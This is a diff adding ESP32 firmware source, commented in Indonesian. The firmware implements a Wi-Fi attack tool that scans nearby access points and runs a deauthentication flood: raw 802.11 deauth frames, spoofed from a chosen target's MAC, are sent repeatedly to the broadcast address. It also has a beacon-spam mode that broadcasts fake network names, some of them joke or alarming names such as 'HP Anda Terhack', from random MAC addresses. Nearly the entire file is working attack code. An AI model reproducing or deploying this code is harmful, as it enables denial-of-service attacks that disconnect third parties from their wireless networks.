@@ -1,0 +1,201 @@
+#include <stdio.h>
+#include <string.h>
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "esp_wifi.h"
+#include "esp_random.h"
+#include "esp_event.h"
+#include "nvs_flash.h"
+#include "globals.h"
+
+// Fungsi sakti buat ubah Teks MAC ke Bytes
+void stringToMac(const char* macStr, uint8_t *macAddr) {
+    unsigned int m[6];
+    sscanf(macStr, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
+    for(int i = 0; i < 6; i++) macAddr[i] = (uint8_t)m[i];
+}
+
+uint8_t beaconPacket[128] = {
+    0x80, 0x00, 0x00, 0x00, 
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x64, 0x00, 0x01, 0x04, 0x00 
+};
+
+const char* fakeSSIDs[] = {
+    "Pencuri Data", "HP Anda Terhack", "RootX-Terminal", 
+    "Beli Bakso Gratis", "Koneksi Lemot", "Polisi Siber", 
+    "Minta Password?", "Pencari Janda"
+};
+
+const char* rickRollLyrics[] = {
+    "1_Never gonna give you up", "2_Never gonna let you down",
+    "3_Never gonna run around", "4_And desert you",
+    "5_Never gonna make you cry", "6_Never gonna say goodbye",
+    "7_Never gonna tell a lie", "8_And hurt you"
+};
+
+uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
+uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
+
+void sendBeacon(const char* ssid) {
+    int ssidLen = strlen(ssid);
+    
+    // Acak MAC Address
+    for(int i = 10; i < 16; i++) {
+        uint8_t r = esp_random() % 256;
+        beaconPacket[i] = r;      
+        beaconPacket[i+6] = r;    
+    }
+
+    // Pasang Nama SSID ke Paket
+    beaconPacket[37] = ssidLen;
+    for(int i = 0; i < ssidLen; i++) {
+        beaconPacket[38+i] = ssid[i];
+    }
+
+    // Tambah Tail
+    uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
+    memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));
+
+    // Tembak pake WIFI_IF_AP sesuai pesanan
+    for (int ch = 1; ch <= 13; ch++) {
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
+        vTaskDelay(pdMS_TO_TICKS(1)); 
+    }
+}
+
+void loopWiFi(void * pvParameters) {
+    // === INITIALIZATION SAKTI (WAJIB ADA DI ESP-IDF) ===
+    static bool isWifiInit = false;
+    if (!isWifiInit) {
+        nvs_flash_init();
+        esp_netif_init();
+        esp_event_loop_create_default();
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        esp_wifi_init(&cfg);
+        esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        isWifiInit = true;
+    }
+
+    for(;;) {
+        if (isSpamming) {
+            if (!spamUdahSetup) {
+                // Diubah ke AP sekalian biar sinkron
+                esp_wifi_set_mode(WIFI_MODE_AP); 
+                esp_wifi_start();
+                esp_wifi_set_promiscuous(true);
+                spamUdahSetup = true;
+            }
+            if (aktifModeSpam == 1) {
+                int randomIdx = esp_random() % 8; 
+                sendBeacon(fakeSSIDs[randomIdx]);
+                vTaskDelay(pdMS_TO_TICKS(10)); 
+            } 
+            else if (aktifModeSpam == 2) {
+                for (int i = 0; i < 8; i++) {
+                    sendBeacon(rickRollLyrics[i]); 
+                    vTaskDelay(pdMS_TO_TICKS(5));
+                }
+            }
+            vTaskDelay(pdMS_TO_TICKS(50)); 
+        } 
+        else if (triggerScan) {
+            sedang_scan = true;
+            adaTarget = false;        
+            targetLockedIdx = -1;     
+            totalWiFi = 0;
+
+            // --- SCAN ESP-IDF STYLE ---
+            esp_wifi_set_mode(WIFI_MODE_STA);
+            esp_wifi_start();
+            
+            wifi_scan_config_t scan_config = {0};
+            esp_wifi_scan_start(&scan_config, true); // Blocking scan!
+            
+            uint16_t ap_count = 0;
+            esp_wifi_scan_get_ap_num(&ap_count);
+            totalWiFi = (ap_count > 30) ? 30 : ap_count;
+            
+            wifi_ap_record_t ap_records[30];
+            esp_wifi_scan_get_ap_records(&totalWiFi, ap_records);
+            
+            for (int i = 0; i < totalWiFi; i++) {
+                listWiFi[i].id = i;
+                strncpy(listWiFi[i].ssid, (char*)ap_records[i].ssid, 32);
+                listWiFi[i].rssi = ap_records[i].rssi;
+                listWiFi[i].channel = ap_records[i].primary;
+                // Format MAC Address manual
+                sprintf(listWiFi[i].mac, "%02x:%02x:%02x:%02x:%02x:%02x",
+                        ap_records[i].bssid[0], ap_records[i].bssid[1],
+                        ap_records[i].bssid[2], ap_records[i].bssid[3],
+                        ap_records[i].bssid[4], ap_records[i].bssid[5]);
+            }
+
+            esp_wifi_stop(); // Matiin STA
+            
+            sedang_scan = false;
+            scanDone = true;     
+            triggerScan = false; 
+        }
+        else if (isDeauthing && adaTarget) {
+            if (!deauthUdahSetup) {
+                esp_wifi_stop();
+                // === REQ LU: UBAH KE AP ===
+                esp_wifi_set_mode(WIFI_MODE_AP); 
+                esp_wifi_start();
+                esp_wifi_set_promiscuous(true);
+                esp_wifi_set_ps(WIFI_PS_NONE); 
+                
+                esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+                deauthUdahSetup = true;
+            }
+
+            uint8_t apMac[6];
+            stringToMac(targetTerkunci.mac, apMac);
+            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+            for (int b = 0; b < 40; b++) {
+                uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
+                
+                uint8_t rawFrame[26];
+                memcpy(rawFrame, deauthFrame, 26);
+                rawFrame[0] = 0xc0; 
+                memcpy(&rawFrame[4], broadcast, 6);
+                memcpy(&rawFrame[10], apMac, 6);
+                memcpy(&rawFrame[16], apMac, 6);
+                rawFrame[22] = seq & 0xFF;
+                rawFrame[23] = (seq >> 8) & 0xFF;
+                rawFrame[24] = 0x01; 
+
+                // === REQ LU: TX VIA AP ===
+                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+                
+                if (err != ESP_OK) {
+                    rawFrame[0] = 0xa0; 
+                    esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+                }
+            }
+            vTaskDelay(pdMS_TO_TICKS(1));
+        }
+
+        // --- MANAJEMEN RADIO WIFI (BIAR GAK PANAS) ---
+        if (!isSpamming && !isDeauthing && !triggerScan) {
+            wifi_mode_t currentMode;
+            esp_wifi_get_mode(&currentMode);
+
+            if (currentMode != WIFI_MODE_NULL) { 
+                esp_wifi_set_promiscuous(false); 
+                esp_wifi_stop();                 
+                esp_wifi_set_mode(WIFI_MODE_NULL); 
+                spamUdahSetup = false;
+                deauthUdahSetup = false;
+            }
+        }
+        
+        vTaskDelay(pdMS_TO_TICKS(10)); 
+    }
+}
